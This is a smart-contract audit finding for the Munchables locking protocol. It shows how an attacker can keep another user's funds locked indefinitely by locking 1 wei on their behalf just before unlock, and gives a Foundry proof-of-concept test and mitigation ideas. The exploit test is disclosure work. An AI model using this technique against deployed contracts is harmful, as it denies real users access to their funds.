# Vulnerability details

## Impact
An attacker can indefinitely extend the lock duration of another user's funds by locking a minimal amount (e.g. 1 wei) of the same asset(s) on behalf of the user just before the user's original lock period would end. 

This results in griefing attack, where the user remains unable to unlock and withdraw their funds even after the intended lock period has expired. 

## Proof of Concept

The following piece of test demonstrates the following scenario:

1. `user` locks ETH in the protocol;
2. just before `user`'s lock duration for the locked ETH would end, `attacker` uses `lockOnBehalfOf` to lock 1 wei on behalf of `user`, increasing `user`s `unlockTime` with `playerSettings[user].lockDuration`
3. after the `user`'s lock duration for the ETH they locked ends, `user` remains unable to unlock the `ETH` they locked, as their `unlockTime` increased with with `playerSettings[user].lockDuration`

```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import "./MunchablesTest.sol";
import {console} from "forge-std/console.sol";

contract AuditTest is MunchablesTest {
    function testGriefingAttack() public {
        deployContracts();

        address user = makeAddr("user");
        address attacker = makeAddr("attacker");

        uint256 lockAmount = 1 ether;

        deal(user, lockAmount);
        deal(attacker, lockAmount);

        // user locks Ether
        vm.startPrank(user);
        amp.register(MunchablesCommonLib.Realm(3), address(0)); // registration
        lm.lock{value: lockAmount}(address(0), lockAmount); // lock ether
        vm.stopPrank();

        uint256 initialUnlockTime = lm.getLocked(user)[0].lockedToken.unlockTime;

        vm.warp(initialUnlockTime - 1);

        console.log("Initial unlocktime ", initialUnlockTime);

        // attacker locks 1 wei on behalf of user to elongate his lock period
        vm.prank(attacker);
        lm.lockOnBehalf{value: 1 wei}(address(0), 1 wei, user);

        uint256 newUnlockTime = lm.getLocked(user)[0].lockedToken.unlockTime;

        vm.warp(initialUnlockTime + 1);

        vm.prank(user);
        vm.expectRevert(bytes4(keccak256("TokenStillLockedError()")));
        lm.unlock(address(0), lockAmount);  // user cannot unlock after the end of the initial lock period

        console.log("New unlocktime ", newUnlockTime);
    }
}

```

## Recommended Mitigation Steps
Consider the following potential mitigation steps, and implement whichever fits your better:

 -Separate Lock Periods:
Maintain separate lock periods for each lock transaction rather than aggregating them. This way, each lock action has its own independent unlock time.

- Minimum Lock Amount:
Introduce a minimum lock amount to prevent attackers from locking insignificant amounts of tokens (e.g., 1 wei) and extending the unlock time maliciously. Even better, enable users to set minimum lock amount for themselves.

- Restricted lockOnBehalf Functionality:
Restrict the usage of the `lockOnBehalf` function to only allow specific trusted contracts or addresses (e.g., approved smart contracts or multisig wallets).
